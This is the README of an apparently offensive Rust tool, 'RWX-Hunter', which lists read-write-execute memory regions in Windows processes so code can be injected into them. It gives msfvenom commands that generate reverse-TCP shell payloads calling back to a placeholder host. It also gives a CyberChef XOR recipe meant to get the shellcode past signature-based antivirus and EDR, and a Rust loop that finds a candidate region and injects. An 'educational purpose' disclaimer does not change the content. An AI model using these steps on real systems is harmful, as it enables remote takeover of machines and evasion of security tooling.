# RWX-Hunter


Enumerating RWX Protected Memory Regions for Code Injection.

[!NOTE]
Developed with the intension of using this tool only for educational purpose.

Generate shellcode (example):

msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f num LHOST=\<IP\> LPORT=\<PORT\>\
msfvenom -p windows/shell_reverse_tcp -a x86 -f num LHOST=\<IP\> LPORT=\<PORT\>

Obfuscate it with static xor key for signature based EDR/AV (example key: 0xC 0x3 0xFA 0x8 0x3)
<https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'0xC0x30xFA0x80x3'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)Find_/_Replace(%7B'option':'Simple%20string','string':','%7D,',%20',true,false,true,false)&oeol=FF>

Inspired by: <https://www.ired.team/offensive-security/defense-evasion/finding-all-rwx-protected-memory-regions>

## Example

```rust
let mut hunter = RWXhunter::new(vec![0], vec![0], vec![12, 3, 250, 8, 3].into());
while hunter.find_next_candidate().is_ok() {
    if hunter.inject().is_ok() {
        return Ok(());
    }
}
```

## Installation

```bash
cargo run
```

## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License

[MIT](https://choosealicense.com/licenses/mit/)

